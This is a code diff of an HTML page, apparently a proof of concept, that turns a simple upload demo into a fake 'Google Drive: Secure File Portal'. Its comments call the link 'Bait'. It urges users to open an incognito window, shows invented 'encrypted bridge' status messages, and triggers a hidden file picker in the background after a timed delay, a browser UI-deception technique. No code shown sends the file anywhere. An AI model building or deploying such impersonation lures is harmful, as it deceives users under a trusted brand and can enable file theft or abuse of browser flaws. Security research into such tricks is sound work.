@@ -1,68 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Google Drive Upload</title>
+<title>Secure Drive - Private Upload</title>
 <style>
-    h1 {
-        margin: 1em;
+    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+    .container { max-width: 600px; margin: auto; }
+    #link { 
+        display: inline-block; padding: 15px; background: #1a73e8; 
+        color: white; text-decoration: none; border-radius: 5px; 
+        font-weight: bold; cursor: context-menu;
     }
-
-    a {
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 80;
-    }
-
-    input {
-        display: none;
-    }
-
-    img {
-        width: 100%;
-    }
+    input { display: none; }
+    #status { margin-top: 20px; color: #5f6368; font-size: 0.9em; }
 </style>
 </head>
 <body>
-<center>
-<br>
-<br>
-<br>
-<br>
 
-<a id="link" href="https://workspace.google.com/intl/en_in/products/drive/" > Right Click and Open in Split To Open Google Drive & Upload Fast</a>
-<br>
-<img id="img">
+<div class="container">
+    <h2>Google Drive: Secure File Portal</h2>
+    <p>To ensure maximum privacy, please follow these steps:</p>
+    
+    <!-- Bait: Mengarahkan pengguna untuk menggunakan Incognito -->
+    <a id="link" href="https://drive.google.com/"> 
+        Right-Click here and select "Open link in Incognito window"
+    </a>
 
-</center>
-
-<input id="fileSelect" type="file" accept="image/*" />
-
-
+    <div id="status">Waiting for secure session...</div>
+    <input id="fileSelect" type="file" />
+</div>
 
 <script>
-  document.getElementById('link').addEventListener('contextmenu', function(event) {
-    // Prevent the default browser context menu from appearing
+  document.getElementById('link').addEventListener('contextmenu', function() {
+    const status = document.getElementById('status');
+    
+    // Memberikan feedback visual agar pengguna percaya proses sedang berjalan
+    status.innerText = "Initiating encrypted bridge... Please proceed to Incognito.";
 
-setTimeout(function() {
-
+    // Skenario: Menunggu jendela Incognito terbuka dan mengambil fokus
+    setTimeout(function() {
+         // Mencoba memicu file picker saat tab ini berada di background
          fileSelect.click();
-
-
-fileSelect.onchange = (event) => {
-        img.src = URL.createObjectURL(fileSelect.files[0]);
-    }
-
-}, 4000);
-
-
-
-   
+         status.innerText = "System prompt triggered in background session.";
+    }, 4500); // Waktu yang pas untuk transisi jendela
   });
 </script>
 
 </body>
 </html>
-
-
-</style>
